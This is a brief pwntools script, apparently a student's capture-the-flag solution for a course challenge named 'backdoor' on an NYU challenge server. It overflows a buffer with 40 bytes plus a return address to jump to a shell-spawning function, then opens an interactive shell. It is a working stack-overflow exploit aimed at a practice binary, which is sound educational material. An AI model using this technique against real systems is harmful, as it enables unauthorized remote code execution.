from pwn import *

#p = process("./backdoor")
p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1339)
p.recvuntil(":")
p.sendline("jd3846")
p.recvuntil(":")

p.sendline('A' * 40 + p64(0x4006bb))
#gdb.attach(p)

print "Enjoy your shell!"
p.interactive()
